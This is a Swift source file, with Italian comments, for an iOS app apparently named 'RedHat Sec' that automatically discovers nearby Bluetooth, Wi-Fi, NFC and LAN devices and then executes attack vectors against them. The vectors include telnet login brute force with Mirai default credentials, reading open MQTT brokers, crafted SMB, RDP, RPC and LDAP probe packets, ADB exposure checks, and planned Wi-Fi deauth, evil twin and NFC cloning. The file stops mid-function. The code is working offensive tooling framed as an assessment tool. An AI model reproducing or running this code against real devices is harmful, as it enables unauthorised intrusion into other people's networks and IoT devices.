import Foundation
import Network
import SwiftUI
import CryptoKit
import Combine

struct PlanEntry: Identifiable {
    var id = UUID()
    var vector: AttackVector
    var target: TargetDevice?
}

@MainActor
final class Orchestrator: ObservableObject {
    @Published var phase: Phase = .idle
    @Published var targets: [TargetDevice] = []
    @Published var findings: [Finding] = []
    @Published var logs: [LogEntry] = []
    @Published var plan: [PlanEntry] = []
    @Published var progress: Double = 0
    @Published var currentStep: String = ""
    @Published var report: Report?
    @Published var reportURL: URL?
    @Published var radarPing: Int = 0
    @Published var attackLog: [AttackRecord] = []
    @Published var nfcDumps: [NFCDump] = []

    let ble = BLEScanner()
    let wifi = WiFiScanner()
    let nfc = NFCScanner()
    let net = NetScanner()
    let shell = ShellRunner.shared
    let bridge = BridgeManager()
    let tcpBridge = TCPBridge()

    init() {
        loadDumps()
        // forwarding: i bridge sono ObservableObject esterni — chi osserva Orchestrator
        // vede anche i loro cambi (statusRow, sheet Impostazioni, ecc.)
        bridgeObservers = [
            bridge.objectWillChange.sink { [weak self] _ in self?.objectWillChange.send() },
            tcpBridge.objectWillChange.sink { [weak self] _ in self?.objectWillChange.send() },
        ]
    }

    private var bridgeObservers: [AnyCancellable] = []

    private let journalPath: URL = {
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        return docs.appendingPathComponent("audit_journal.txt")
    }()

    func log(_ text: String, _ level: LogEntry.Level = .info) {
        let line = "[\(timeNow())] [\(level.rawValue.uppercased())] \(text)"
        logs.append(LogEntry(level: level, text: text))
        if let fh = try? FileHandle(forWritingTo: journalPath) {
            _ = try? fh.seekToEnd()
            try? fh.write(contentsOf: Data((line + "\n").utf8))
            try? fh.close()
        } else {
            try? (line + "\n").write(to: journalPath, atomically: true, encoding: .utf8)
        }
    }

    private func timeNow() -> String {
        let f = DateFormatter(); f.dateFormat = "HH:mm:ss"
        return f.string(from: Date())
    }

    private func addTarget(_ t: TargetDevice) {
        guard !targets.contains(where: { $0.proto == t.proto && ($0.mac ?? $0.name) == (t.mac ?? t.name) }) else { return }
        var t = t
        let raw = t.name
        t.name = TargetNamer.pretty(t, rawName: raw)
        t.extra["rawName"] = raw
        targets.append(t)
        radarPing += 1
        log("target discovered: \(t.name) [\(t.proto.rawValue)] rssi=\(t.rssi)", .good)
    }

    // MARK: - FSM

    func startScan() {
        guard phase == .idle || phase == .report else { return }
        phase = .scan
        targets = []; plan = []; findings = []; report = nil; progress = 0
        log("=== session start — journal rehydrated ===", .exec)
        WiFiScanner.requestLocationPermission()
        log("jailbreak: \(shell.isJailbroken ? "detected" : "NOT detected") — tools: \(shell.availableTools.joined(separator: ", ").isEmpty ? "none" : shell.availableTools.joined(separator: ", "))", .exec)

        Task {
            await self.runScanPipeline()
        }
    }

    private func runScanPipeline() async {
        CrashTracer.mark("pipeline start")
        // NFC in parallelo (attende tap)
        let nfcTask = Task { [weak self] () -> NFCDump? in
            guard let self else { return nil }
            return await self.nfc.fullScan(timeout: 18)
        }

        // BLE
        phase = .scan
        log("BLE sweep…", .exec)
        await withCheckedContinuation { c in
            ble.startScan(timeout: 8) { [weak self] t in
                MainActor.assumeIsolated { self?.addTarget(t) }
            }
            DispatchQueue.global().asyncAfter(deadline: .now() + 8) { c.resume() }
        }

        // Wi-Fi: se il bridge ESP8266 è online lo fa la radio del bridge, altrimenti sonde locali
        if phase == .scan {
            CrashTracer.mark("pipeline: wifi")
            if tcpBridge.connected {
                log("Wi-Fi recon via bridge ESP8266…", .exec)
                let nets = await tcpBridge.wifiScan(seconds: 8)
                if nets.isEmpty {
                    log("Wi-Fi bridge: nessuna rete vista dalla radio ESP8266", .warn)
                } else {
                    log("Wi-Fi bridge: \(nets.count) rete(e) via ESP8266", .good)
                    for n in nets {
                        var t = TargetDevice(name: n.ssid, proto: .wifi, rssi: n.rssi, mac: n.bssid, via: "ESP8266 bridge")
                        t.extra["sec"] = n.sec
                        t.extra["ch"] = String(n.ch)
                        addTarget(t)
                    }
                }
            } else {
                log("Wi-Fi metadata probe (MobileWiFi)…", .exec)
                let nets = await Task.detached { [wifi] in wifi.availableNetworks() }.value
                if nets.isEmpty {
                    log("Wi-Fi: sonde locali fallite — connetti il bridge ESP8266 per il recon radio — diag: \(self.wifi.lastDiag)", .warn)
                } else {
                    log("Wi-Fi: \(nets.count) rete(e) — \(self.wifi.lastDiag)", .good)
                    for n in nets {
                        var t = TargetDevice(name: n.ssid, proto: .wifi, rssi: n.rssi, mac: n.bssid, via: "Wi-Fi")
                        t.extra["sec"] = n.sec
                        addTarget(t)
                    }
                }
            }
        }

        // mDNS
        log("mDNS/Bonjour sweep (_hap, _googlecast, _esphomelib, _ipp)…", .exec)
        await withCheckedContinuation { c in
            net.bonjour { [weak self] t in
                DispatchQueue.main.async {
                    Task { @MainActor [weak self] in self?.addTarget(t) }
                }
            }
            DispatchQueue.global().asyncAfter(deadline: .now() + 6) { c.resume() }
        }
        net.stopBonjour()

        // SSDP
        log("SSDP M-SEARCH (ssdp:all)…", .exec)
        await withCheckedContinuation { c in
            net.ssdp(timeout: 6) { [weak self] t in
                DispatchQueue.main.async {
                    Task { @MainActor [weak self] in self?.addTarget(t) }
                }
                // friendly name SSDP: fetch ASYNC (mai sync sul main) + rename del target
                if let desc = t.extra["desc"], let url = URL(string: desc) {
                    URLSession.shared.dataTask(with: url) { data, _, _ in
                        guard let data,
                              let friendly = TargetNamer.friendlyNameFromXML(String(decoding: data, as: UTF8.self)) else { return }
                        DispatchQueue.main.async { [weak self] in
                            guard let self else { return }
                            if let idx = self.targets.firstIndex(where: { $0.extra["desc"] == desc }) {
                                self.targets[idx].name = friendly
                            }
                        }
                    }.resume()
                }
            }
            DispatchQueue.global().asyncAfter(deadline: .now() + 7) { c.resume() }
        }

        // NFC risultato
        if let dump = await nfcTask.value {
            var t = TargetDevice(name: dump.title, proto: .nfc, rssi: 0, via: "NFC field")
            t.extra["uid"] = dump.uid
            t.extra["family"] = dump.family
            addTarget(t)
            saveDump(dump)
            log("NFC dump: \(dump.title) — \(dump.pages.count) pages, \(dump.ndefHex.count) NDEF", .good)
        } else {
            log("NFC: nessun tag letto in sessione", .info)
        }

        // ENUMERATE: port probe su host noti
        phase = .enumerate
        log("TCP enumeration su host scoperti (23,80,161,502,554,1883,5683,8080,9100)…", .exec)
        var enumerated: [TargetDevice] = []
        for t in targets.filter({ $0.proto == .net && isNumericHost($0.extra["host"]) }) {
            let host = t.extra["host"]!
            let found = await collectPorts(host: host)
            var t2 = t
            t2.extra["open"] = found.ports.joined(separator: ",")
            t2.extra["banners"] = found.banners
            enumerated.append(t2)
            log("\(host): open [\(found.ports.joined(separator: ","))]", found.ports.isEmpty ? .warn : .good)
        }
        for e in enumerated { if let idx = targets.firstIndex(where: { $0.id == e.id }) { targets[idx] = e } }

        // MATCH
        phase = .match
        buildPlan()
        CrashTracer.mark("pipeline done: \(plan.count) vectors")
        log("plan armed: \(plan.count) vector(s) — conferma per eseguire", .good)
        phase = .armed
        progress = 1.0
    }

    private func isNumericHost(_ h: String?) -> Bool {
        guard let h, !h.isEmpty else { return false }
        return h.range(of: "^[0-9.]+$") != nil || h.contains(":")
    }

    private func collectPorts(host: String) async -> (ports: [String], banners: String) {
        if tcpBridge.connected {
            let found = await tcpBridge.portScan(host: host, ports: [23, 80, 161, 502, 554, 1883, 5683, 8080, 9100])
            let ports = found.map { String($0.0) }
            let banners = found.filter { !$0.1.isEmpty }
                .map { "\($0.0): \($0.1.prefix(100))" }
                .joined(separator: " | ")
            log("port scan via bridge \(host): [\(ports.joined(separator: ","))]", ports.isEmpty ? .warn : .good)
            return (ports, banners)
        }
        let lock = NSLock()
        var ports: [String] = []
        var banners: [String] = []
        await withCheckedContinuation { (c: CheckedContinuation<Void, Never>) in
            NetScanner.portProbe(host: host, ports: [23, 80, 161, 502, 554, 1883, 5683, 8080, 9100],
                                 timeout: 2) { port, banner in
                lock.lock()
                ports.append(String(port))
                if !banner.isEmpty { banners.append("\(port): \(banner.prefix(120))") }
                lock.unlock()
            } onDone: { c.resume() }
        }
        lock.lock()
        let p = ports; let b = banners
        lock.unlock()
        return (p, b.joined(separator: " | "))
    }

    // MARK: - Matching

    private func vec(_ id: String) -> AttackVector? { VectorDB.all().first { $0.id == id } }

    private func buildPlan() {
        var entries: [PlanEntry] = []
        let tools = Set(shell.availableTools)

        for t in targets {
            switch t.proto {
            case .ble:
                if let v = vec("ble_enum") { entries.append(PlanEntry(vector: v, target: t)) }
                if let v = vec("ble_write") { entries.append(PlanEntry(vector: v, target: t)) }
                if let v = vec("ble_sweyntooth") { entries.append(PlanEntry(vector: v, target: t)) }
                for id in ["ble_blueborne", "ble_bias", "ble_knob"] {
                    if let v = vec(id) { entries.append(PlanEntry(vector: v, target: t)) }
                }
            case .wifi:
                for id in ["wifi_deauth", "wifi_pmkid", "wifi_eviltwin", "wifi_wps_pixie"] {
                    if let v = vec(id) { entries.append(PlanEntry(vector: v, target: t)) }
                }
            case .net:
                let open = (t.extra["open"] ?? "").split(separator: ",", omittingEmptySubsequences: true).compactMap { UInt16(String($0)) }
                let map: [UInt16: String] = [23: "net_telnet", 161: "net_snmp", 502: "net_modbus",
                                             554: "net_rtsp", 1883: "net_mqtt", 5683: "net_coap",
                                             80: "net_upnp", 8080: "net_upnp"]
                for p in open {
                    if let id = map[p], let v = vec(id), v.cap == Capability.native {
                        entries.append(PlanEntry(vector: v, target: t))
                    }
                }
                if open.contains(80) || open.contains(8080) {
                    if let v = vec("net_hnap") { entries.append(PlanEntry(vector: v, target: t)) }
                }
            case .nfc:
                // Mifare Classic keys/dump declassati a PLAN (PoC fisico richiesto — CoreNFC non espone l'auth)
                if let v = vec("nfc_ndef_inject") { entries.append(PlanEntry(vector: v, target: t)) }
                if let v = vec("nfc_clone"), t.extra["dump"] != nil {
                    entries.append(PlanEntry(vector: v, target: t))
                }
            default: break
            }
        }

        // shell tool globali disponibili
        let shellMap: [String: String] = ["nmap": "net_telnet", "tcpdump": "wifi_handshake",
                                          "reaver": "wifi_wps_pin", "pixiewps": "wifi_wps_pixie",
                                          "hcxdumptool": "wifi_pmkid", "mdk3": "wifi_beaconflood",
                                          "yersinia": "wifi_dhcp_starve", "ettercap": "wifi_arppois",
                                          "zbdsniff": "zb_rejoin", "curl": "net_hnap"]
        for tool in shell.availableTools where tools.contains(tool) {
            if let id = shellMap[tool], let v = vec(id), !entries.contains(where: { $0.vector.id == id }) {
                entries.append(PlanEntry(vector: v, target: nil))
            }
        }
        plan = entries
    }

    // MARK: - Execute

    func execute() {
        guard phase == .armed, !plan.isEmpty else { return }
        phase = .execute
        Haptics.heavy()
        findings = []
        log("=== execution start — \(plan.count) step(s) ===", .exec)
        Task { await runExecution() }
    }

    private func runExecution() async {
        let total = plan.count
        for (i, entry) in plan.enumerated() {
            currentStep = entry.vector.name
            log("→ \(entry.vector.name) (\(entry.vector.ref))", .exec)
            let evidence = await runVector(entry)
            let proof = proofFor(entry, evidence)
            let f = Finding(vectorID: entry.vector.id,
                            title: entry.vector.name,
                            target: entry.target.map { "\($0.name)" } ?? "global",
                            sev: proof == .bannerOnly ? .info : entry.vector.sev,
                            cvss: proof == .bannerOnly ? 0 : entry.vector.cvss,
                            cvssVec: entry.vector.cvssVec,
                            attack: entry.vector.attack,
                            evidence: String(evidence.prefix(1500)),
                            repro: [entry.vector.prereq, entry.vector.hint],
                            impact: entry.vector.brief,
                            remediation: entry.vector.remediation,
                            proof: proof,
                            evidenceHash: sha256Hex(String(evidence.prefix(1500))),
                            utc: isoUTC())
            findings.append(f)
            attackLog.append(AttackRecord(vectorID: entry.vector.id, vector: entry.vector.name,
                                          target: f.target, outcome: outcomeLabel(entry, evidence),
                                          evidence: String(evidence.prefix(200))))
            journal("finding[\(f.sev.rawValue)] \(f.title) @ \(f.target) — \(String(evidence.prefix(120)))")
            progress = Double(i + 1) / Double(total)
        }
        currentStep = ""
        let rep = Report(title: "RedHat Sec — Assessment \(DateFormatter.localizedString(from: Date(), dateStyle: .short, timeStyle: .short))",
                         date: Date(), targets: targets, findings: findings)
        report = rep
        reportURL = ReportBuilder.write(rep)
        phase = .report
        Haptics.win()
        log("report generato: \(findings.count) finding(s)", .good)
    }

    func executeOnly(_ entry: PlanEntry) {
        phase = .armed
        plan = [entry]
        findings = []
        execute()
    }

    func addVectorToPlan(_ id: String, target: TargetDevice) {
        guard let v = vec(id) else { return }
        guard !plan.contains(where: { $0.vector.id == id && $0.target?.id == target.id }) else { return }
        plan.append(PlanEntry(vector: v, target: target))
        log("plan add: \(v.name) → \(target.name)", .info)
    }

    func removePlanEntry(_ e: PlanEntry) {
        plan.removeAll { $0.id == e.id }
    }

    // MARK: - Auto-prepare (config derivata, zero input manuale)

    @Published var prepBusy = false

    func autoPrepareTarget(_ t: TargetDevice) async {
        prepBusy = true
        log("AUTO-PREPARE \(t.name)…", .exec)
        await autoPrepare(t)
        buildPlan()
        log("AUTO-PREPARE \(t.name) completato", .good)
        prepBusy = false
        phase = .armed
    }

    func autoPrepareAll() async {
        prepBusy = true
        log("AUTO-PREPARE: calibrazione per-target (\(targets.count))…", .exec)
        for t in targets { await autoPrepare(t) }
        buildPlan()
        log("AUTO-PREPARE completato — \(plan.count) vector(s) con config derivata", .good)
        prepBusy = false
        phase = .armed
    }

    private func autoPrepare(_ t0: TargetDevice) async {
        var t = t0
        switch t.proto {
        case .ble:
            let rep = await ble.enumerate(t)
            if let w = rep.writable.first {
                t.extra["svcUUID"] = w.svc
                t.extra["chrUUID"] = w.chr
                if (t.extra["payload"] ?? "").isEmpty { t.extra["payload"] = "0100" }
                t.extra["autoArm"] = "1"
                log("auto-arm BLE \(t.name): chr=\(w.chr.prefix(12)) payload=\(t.extra["payload"] ?? "0100")", .good)
            } else {
                t.extra["gatt"] = String(rep.lines.joined(separator: " | ").prefix(300))
                if !rep.ssidCandidates.isEmpty {
                    t.extra["ssidBLE"] = String(rep.ssidCandidates.joined(separator: " | ").prefix(200))
                    log("BLE \(t.name): SSID via GATT → \(rep.ssidCandidates.first ?? "?")", .good)
                }
                log("BLE \(t.name): nessuna chr scrivibile — flood/sweyntooth armati senza config", .warn)
            }
        case .net:
            guard let host = t.extra["host"], isNumericHost(host) else { break }
            let found = await collectPorts(host: host)
            t.extra["open"] = found.ports.joined(separator: ",")
            t.extra["banners"] = found.banners
            if found.ports.contains("1883") {
                let r = await netMQTT(host)
                t.extra["mqtt"] = r.contains("APERTO") ? "open" : "auth"
            }
            if found.ports.contains("554") {
                let req = "OPTIONS rtsp://\(host):554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
                let r = await tcpRoundTrip(host: host, port: 554, payload: req.data(using: .ascii) ?? Data(), timeout: 3)
                t.extra["rtsp"] = r.isEmpty ? "muto" : "risponde"
            }
            if found.ports.contains("161") {
                let r = await udpRoundTrip(host: host, port: 161, payload: snmpGetSysDescr(), timeout: 3)
                t.extra["snmp"] = r.isEmpty ? "muto" : "community public valida"
            }
            if found.ports.contains("23") {
                let b = await tcpRoundTrip(host: host, port: 23, payload: Data(), timeout: 2, maxRecv: 1)
                t.extra["telnet"] = b.isEmpty ? "muto" : String(b.prefix(80))
            }
            log("net prep \(host): open=[\(found.ports.joined(separator: ","))]", found.ports.isEmpty ? .warn : .good)
        case .wifi:
            t.extra["ch"] = t.extra["ch"] ?? "auto"
            t.extra["armNote"] = "BSSID \(t.mac ?? "?") — attacco radio richiede monitor-mode esterna: args auto-configurati"
            log("wifi prep \(t.name): BSSID=\(t.mac ?? "?") sec=\(t.extra["sec"] ?? "?") — args pronti", .info)
        case .nfc:
            if let uid = t.extra["uid"], !uid.isEmpty,
               let d = nfcDumps.first(where: { !$0.uid.isEmpty && uid.hasPrefix($0.uid) }) {
                t.extra["dump"] = d.uid
                log("nfc prep \(t.name): dump locale (\(d.pages.count) pagine) — clone armato", .good)
            } else {
                log("nfc prep \(t.name): serve dump — usa Tools › NFC › fingerprint", .warn)
            }
        default: break
        }
        if let idx = targets.firstIndex(where: { $0.id == t.id }) { targets[idx] = t }
    }

    private func outcomeLabel(_ e: PlanEntry, _ evidence: String) -> String {
        switch e.vector.cap {
        case .shellTool(let t):
            return evidence.hasPrefix("PLAN") ? "tool missing" : "tool:\(t)"
        case .plan:
            return "plan"
        case .native:
            return evidence.hasPrefix("handler") || evidence.hasPrefix("no ") ? "failed" : "executed"
        }
    }

    // no-PoC-no-finding: solo exploit_confirmed/response_confirmed portano severità piena
    static let proofMap: [String: ProofType] = [
        "ble_enum": .responseConfirmed,
        "ble_write": .exploitConfirmed,
        "ble_connectflood": .responseConfirmed,
        "ble_sweyntooth": .bannerOnly,
        "ble_l2cap_probe": .responseConfirmed,
        "ble_rce": .exploitConfirmed,
        "os_android_adb": .responseConfirmed,
        "os_android_fastpair": .bannerOnly,
        "os_ios_lockdown": .bannerOnly,
        "os_ios_continuity": .bannerOnly,
        "os_win_smb": .responseConfirmed,
        "os_win_rdp": .responseConfirmed,
        "os_linux_ssh": .responseConfirmed,
        "os_linux_cups": .responseConfirmed,
        "os_mac_rmd": .bannerOnly,
        "os_iot_tuya": .bannerOnly,
        "net_mqtt": .exploitConfirmed,
        "net_telnet": .exploitConfirmed,
        "net_snmp": .responseConfirmed,
        "net_coap": .responseConfirmed,
        "net_modbus": .responseConfirmed,
        "net_rtsp": .bannerOnly,
        "net_upnp": .responseConfirmed,
        "net_hnap": .bannerOnly,
        "nfc_ndef_inject": .exploitConfirmed,
        "nfc_clone": .exploitConfirmed,
        "os_win_ms17_010": .responseConfirmed,
        "os_unix_telnet": .responseConfirmed,
        "os_unix_rlogin": .bannerOnly,
        "os_win_epmapper": .responseConfirmed,
        "os_win_winrm": .bannerOnly,
        "os_linux_nfs": .bannerOnly,
        "os_linux_ldap": .responseConfirmed,
        "os_mac_afp": .bannerOnly,
        "os_mac_bonjour": .bannerOnly,
        "os_ios_airplay": .responseConfirmed,
        "os_android_dial": .bannerOnly,
        "os_solaris_rpc": .responseConfirmed,
        "os_embed_ftp": .responseConfirmed,
    ]

    // tool richiesti dal vettore e NON ancora presenti sul device
    func missingTools(for vectorID: String) -> [ToolSpec] {
        guard let names = VectorDB.vectorTools[vectorID] else { return [] }
        return names.compactMap { ToolRegistry.spec($0) }
            .filter { s in s.bins.first { ShellRunner.shared.resolve($0) != nil } == nil }
    }

    private func proofFor(_ e: PlanEntry, _ evidence: String) -> ProofType {
        if e.vector.cap == .plan { return .bannerOnly }
        guard let expected = Self.proofMap[e.vector.id] else { return .bannerOnly }
        switch expected {
        case .exploitConfirmed:
            let hit = evidence.contains("✓") || evidence.contains("SUCCESS") ||
                      evidence.contains("KEY FOUND") || evidence.contains("PWD FOUND")
            return hit ? .exploitConfirmed : .responseConfirmed
        case .responseConfirmed:
            let weak = evidence.contains("muto") || evidence.contains("nessuna risposta") ||
                       evidence.contains("PLAN") || evidence.contains("non implementato")
            return weak ? .bannerOnly : .responseConfirmed
        case .bannerOnly:
            return .bannerOnly
        }
    }

    private func sha256Hex(_ s: String) -> String {
        SHA256.hash(data: Data(s.utf8)).map { String(format: "%02x", $0) }.joined()
    }

    private func isoUTC() -> String {
        ISO8601DateFormatter().string(from: Date())
    }

    // MARK: exec net via radio ESP8266 (payload builders esistenti, esecuzione dal bridge)

    private func bridgeRT(_ host: String, _ port: UInt16, _ payload: Data, udp: Bool = false, timeout: TimeInterval = 4) async -> Data? {
        await tcpBridge.roundTrip(host: host, port: Int(port), payload: [UInt8](payload), udp: udp, timeout: timeout)
    }

    private func bridgeMQTT(_ host: String) async -> String {
        let ack = await bridgeRT(host, 1883, mqttConnectPacket(), timeout: 5)
        guard let ack, ack.first == 0x20 else {
            return "CONNECT via bridge — CONNACK non ricevuto (muto o auth richiesta)"
        }
        let msgs = await bridgeRT(host, 1883, mqttSubscribePacket(), timeout: 6) ?? Data()
        return "CONNACK OK via bridge — broker APERTO (no auth). SUBSCRIBE # → \(msgs.isEmpty ? "(silenzio, broker scrivibile)" : String(decoding: msgs.prefix(600), as: UTF8.self))"
    }

    private func bridgeTelnet(_ host: String) async -> String {
        let creds: [(String, String)] = [("root", "xc3511"), ("root", "vizxv"), ("admin", "admin"),
                                         ("root", "root"), ("admin", "1234"), ("root", "1234")]
        for (u, p) in creds {
            let r = await bridgeRT(host, 23, Data("\(u)\n\(p)\n".utf8), timeout: 4)
            if let r, let s = String(data: r, encoding: .utf8),
               s.contains("BusyBox") || s.contains("Welcome") || s.lowercased().contains("uid=") || s.contains("~#") {
                return "SUCCESS via bridge — telnet \(u):\(p) su \(host). Shell: \(s.prefix(250))"
            }
        }
        return "telnet via bridge: tabella Mirai esaurita — nessuna cred valida"
    }

    private func bridgeUPnP(_ host: String) async -> String {
        let search = "M-SEARCH * HTTP/1.1\r\nHOST: \(host):1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
        let resp = await bridgeRT(host, 1900, Data(search.utf8), udp: true, timeout: 5)
        guard let resp, !resp.isEmpty else { return "UPnP via bridge: M-SEARCH senza risposta" }
        return "UPnP via bridge: \(String(decoding: resp, as: UTF8.self).prefix(500))"
    }

    // MARK: OS-wide probes (dalla radio bridge o dai socket app)

    private func rawRT(_ host: String, _ port: UInt16, _ payload: Data, timeout: TimeInterval = 3) async -> Data? {
        if tcpBridge.connected {
            return await bridgeRT(host, port, payload, timeout: timeout)
        }
        let s = await tcpRoundTripData(host: host, port: port, payload: payload, timeout: timeout)
        return s.isEmpty ? nil : s
    }

    private func portOpen(_ host: String, _ port: UInt16) async -> Bool {
        if tcpBridge.connected {
            return await tcpBridge.portScan(host: host, ports: [port]).contains { $0.0 == port }
        }
        // handshake-only: connect riuscito = porto aperto (i server che tacciono prima del primo byte non vengono più marcati chiusi)
        let s = TCPSession()
        let ok = await withCheckedContinuation { c in s.connect(host, port, timeout: 3) { c.resume(returning: $0) } }
        s.close()
        return ok
    }

    private func runOSProbe(_ id: String, _ e: PlanEntry) async -> String {
        guard let t = e.target, let host = t.extra["host"] else { return "no host" }
        switch id {
        case "os_android_adb":
            let d = await rawRT(host, 5555, Data("000Chost:version".utf8))
            guard let d, !d.isEmpty else { return "ADB 5555: nessuna risposta — adb TCP chiuso" }
            let s = String(decoding: d, as: UTF8.self)
            return s.contains("OKAY")
                ? "ADB APERTO su \(host):5555 → \(s.prefix(120)) — adb shell disponibile (RCE Android; root se ro.debuggable)"
                : "ADB 5555 risponde ma handshake non standard: \(s.prefix(120))"
        case "os_ios_lockdown":
            return await portOpen(host, 62078)
                ? "lockdownd 62078 APERTO su \(host) — Wi-Fi sync/companion raggiungibile"
                : "62078 chiuso"
        case "os_win_smb":
            let blob = Data([0x00,0x00,0x00,0x2f,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x07,0xc8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x0c,0x00,0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00])
            let d = await rawRT(host, 445, blob)
            guard let d, !d.isEmpty else { return "SMB 445: nessuna risposta" }
            let ntlm = String(decoding: d, as: UTF8.self).contains("NTLMSSP")
            let smb1 = d.contains(0xff) && d.contains(0x53) && d.contains(0x4d) && d.contains(0x42)
            return smb1 || ntlm
                ? "SMB APERTO su \(host):445 — negotiate resp (\(ntlm ? "NTLMSSP / SMB2+" : "SMB1 dialect")) → dialect/CVE mapping (EternalBlue se SMB1)"
                : "SMB 445 risposta non-SMB: \(d.map { String(format: "%02x", $0) }.joined().prefix(80))"
        case "os_win_rdp":
            let cr = Data([0x03,0x00,0x00,0x13,0x0e,0xe0,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x08,0x00,0x03,0x00,0x00,0x00])
            let d = await rawRT(host, 3389, cr)
            guard let d, !d.isEmpty, d[0] == 0x03 else {
                return d != nil && !(d?.isEmpty ?? true)
                    ? "RDP 3389 risponde non-TPKT: \(String(decoding: d!.prefix(80), as: UTF8.self))"
                    : "RDP 3389: nessuna risposta"
            }
            let protoFlag: UInt8 = {
                if let r = d.range(of: Data([0x02, 0x00, 0x08, 0x00]), in: 10..<d.count) { return d[r.lowerBound + 4] }
                return 0
            }()
            return "RDP APERTO su \(host):3389 — negotiate resp (proto \(String(format: "0x%02x", protoFlag)); 0x02=TLS/NLA, 0x01=standard → precondizioni BlueKeep)"
        case "os_linux_ssh":
            let d = await rawRT(host, 22, Data())
            guard let d, !d.isEmpty else { return "SSH 22: nessun banner" }
            let s = String(decoding: d.prefix(120), as: UTF8.self)
            return s.contains("SSH-") ? "SSH banner: \(s.prefix(80)) → mapping CVE OpenSSH" : "22 aperto, banner: \(s.prefix(80))"
        case "os_linux_cups":
            let q = Data("GET /printers HTTP/1.1\r\nHost: \(host):631\r\n\r\n".utf8)
            let d = await rawRT(host, 631, q)
            guard let d, !d.isEmpty else { return "CUPS 631: nessuna risposta" }
            let s = String(decoding: d.prefix(200), as: UTF8.self)
            return s.contains("HTTP")
                ? "CUPS/IPP APERTO → \(s.prefix(120)) (abuso print-jobs; CVE CUPS 2024)"
                : "631 risposta: \(s.prefix(120))"
        case "os_mac_rmd":
            return await portOpen(host, 3283)
                ? "ARD 3283 APERTO su \(host) — Remote Management raggiungibile (chain VNC/screen sharing)"
                : "3283 chiuso"
        case "os_iot_tuya":
            var states: [String] = []
            for p: UInt16 in [6668, 8886] {
                states.append("\(p): \(await portOpen(host, p) ? "APERTO" : "chiuso")")
            }
            let any = states.contains { $0.contains("APERTO") }
            return "Tuya probe \(host) — \(states.joined(separator: " · "))\(any ? " → fingerprint Tuya: abuso cloud/broadcast key" : "")"
        case "os_win_ms17_010":
            return await ms17Check(host)
        case "os_unix_telnet":
            let d = await rawRT(host, 23, Data())
            guard let d, !d.isEmpty else { return "telnet 23: nessun banner — chiuso" }
            let b = String(decoding: d.prefix(120), as: UTF8.self).trimmingCharacters(in: .whitespacesAndNewlines)
            for cred in [("admin", "admin"), ("root", "root"), ("admin", ""), ("root", "alpine")] {
                let d2 = await rawRT(host, 23, Data("\r\n\(cred.0)\r\n\(cred.1)\r\nid\r\n".utf8), timeout: 4)
                if let d2, let s2 = String(data: d2, encoding: .utf8)?.lowercased(), s2.contains("uid=") {
                    return "TELNET APERTO (\(b.prefix(60))) — LOGIN ACCEPTED \(cred.0):\(cred.1) → shell raggiunta (RCE)"
                }
            }
            return "telnet APERTO (\(b.prefix(60))) — banner esposto, cred probe non conclusivo"
        case "os_unix_rlogin":
            let d = await rawRT(host, 513, Data([0x00]) + Data("root\u{00}root\u{00}".utf8))
            guard let d, !d.isEmpty else { return "rlogin 513: chiuso" }
            let s = String(decoding: d.prefix(120), as: UTF8.self)
            return s.contains("Permission denied") || s.contains("denied")
                ? "rlogin 513 risponde con trust negato"
                : "RLOGIN APERTO su \(host):513 — resp: \(s.prefix(100)) → trust .rhosts possibile"
        case "os_win_epmapper":
            let bind = Data(hexString: "05000b0310000000480000000000000010b80d0010b80d000000000001000000010001000883afe11f5dc91191a408002b14a0fa0300045d888aeb1cc911ac740000c00200000200") ?? Data()
            let d = await rawRT(host, 135, bind)
            guard let d, d.count > 30 else { return "epmapper 135: nessuna risposta" }
            let ver = d.count > 3 ? "\(d[0]).\(d[1])" : "?"
            return d[0] == 0x05
                ? "EPMAPPER APERTO su \(host):135 — bind_ack \(ver) ricevuto → enum UUID servizi RPC (DCOM/PsExec chain)"
                : "135 risponde non-RPC"
        case "os_win_winrm":
            return await portOpen(host, 5985)
                ? "WinRM 5985 APERTO su \(host) — listener PowerShell remoto attivo (lateral movement precheck)"
                : "5985 chiuso"
        case "os_linux_nfs":
            return await portOpen(host, 204)
                ? "NFS 204 APERTO su \(host) — export raggiungibile (check showmount/no_root_squash)"
                : "204 chiuso"
        case "os_linux_ldap":
            let bind = Data([0x30, 0x0c, 0x02, 0x01, 0x01, 0x60, 0x07, 0x02, 0x01, 0x03, 0x04, 0x00, 0x80, 0x00])
            let d = await rawRT(host, 389, bind)
            guard let d, d.count >= 10 else { return "ldap 389: nessuna risposta" }
            // bindResponse può arrivare raw (0x61) o wrapped in LDAPMessage (0x30)
            guard d[0] == 0x61 || d[0] == 0x30 else { return "389 risponde non-LDAP" }
            if let r = d.range(of: Data([0x02, 0x01]), in: 1..<d.count) {
                let code = d[r.upperBound]
                return code == 0
                    ? "LDAP ANON BIND SUCCESS su \(host) — enum subtree aperta (utenti/gruppi → Kerberoast recon)"
                    : "LDAP bind resp error code \(code)"
            }
            return "389 bind resp non decodificabile: \(d.prefix(12).map { String(format: "%02x", $0) }.joined())"
        case "os_mac_afp":
            return await portOpen(host, 548)
                ? "AFP 548 APERTO su \(host) — file sharing attivo (check guest)"
                : "548 chiuso"
        case "os_mac_bonjour":
            return await portOpen(host, 5353)
                ? "mDNS-SD 5353/tcp APERTO su \(host) — servizi _airplay/_ipp enumabili"
                : "5353 tcp chiuso (mDNS UDP non probe da qui)"
        case "os_ios_airplay":
            let d = await rawRT(host, 7000, Data("GET /server-info HTTP/1.1\r\nHost: \(host):7000\r\n\r\n".utf8))
            guard let d, !d.isEmpty else { return "airplay 7000: nessuna risposta" }
            let s = String(decoding: d.prefix(300), as: UTF8.self)
            return s.contains("text/parameters") || s.contains("deviceid")
                ? "AIRPLAY APERTO su \(host):7000 — \(s.split(separator: "\n").filter { $0.contains("deviceid") || $0.contains("name") }.prefix(2).joined(separator: " · ")) → replay/abuso possibile"
                : "7000 risponde: \(s.prefix(120))"
        case "os_android_dial":
            return await portOpen(host, 8009)
                ? "CAST 8009 APERTO su \(host) — receiver Chromecast attivo (app/media injection possibile)"
